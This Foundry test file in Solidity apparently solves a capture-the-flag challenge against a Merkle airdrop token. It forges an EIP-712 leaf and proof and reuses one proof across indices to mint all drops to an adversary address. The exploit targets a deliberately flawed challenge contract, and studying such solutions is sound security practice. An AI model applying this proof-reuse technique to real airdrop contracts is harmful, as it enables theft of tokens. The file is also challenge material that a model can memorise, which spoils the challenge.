// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {ShinyToken} from "challenges/4-MerkleAirDrop.sol";
import {MerkleAirDropFactory} from "challenges/MerkleAirDropFactory.sol";
import {MessageHashUtils} from "openzeppelin-contracts/contracts/utils/cryptography/EIP712.sol";

contract MerkleAirDropTest is Test {
    address public immutable advAddress = makeAddr("advAddress");
    ShinyToken public shinyToken;

    function setUp() public {
        shinyToken = ShinyToken(MerkleAirDropFactory.deploy(advAddress));
    }

    function test_solve() public {
        // Generate a valid proof for the adversary
        bytes32 leafHash = _hashDrop(advAddress, 100, false, shinyToken);
        bytes32[] memory proof = new bytes32[](1);
        proof[0]  = _hashDrop(0x0000000000000000000000000000bEEFBeeFBeEF, 300, true, shinyToken);
        // Reuse same proof to mint all drops to the adversary
        shinyToken.redeem(advAddress, 100, false, 0, proof);
        shinyToken.redeem(advAddress, 100, false, 1, proof);

        assertEq(shinyToken.balanceOf(advAddress), 400);
        assertTrue(shinyToken.isSolved());
    }

    bytes32 public constant DROP_TYPEHASH = keccak256("Drop(address user,uint256 amount,bool premium)");
    bytes32 private constant EIP712DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
   
    function _hashDrop(address user, uint256 amount, bool premium, ShinyToken token) private view returns (bytes32) {
        return _hashTypedDataV4(keccak256(abi.encode(DROP_TYPEHASH, user, amount, premium)), token);
    }

    function _hashTypedDataV4(bytes32 structHash, ShinyToken token) internal view returns (bytes32) {
        return MessageHashUtils.toTypedDataHash(_buildDomainSeparator(token), structHash);
    }

    function _buildDomainSeparator(ShinyToken token) private view returns (bytes32) {
        return keccak256(
            abi.encode(EIP712DOMAIN_TYPEHASH, keccak256("MerkleAirDrop"), keccak256("1"), block.chainid, address(token))
        );
    }
}

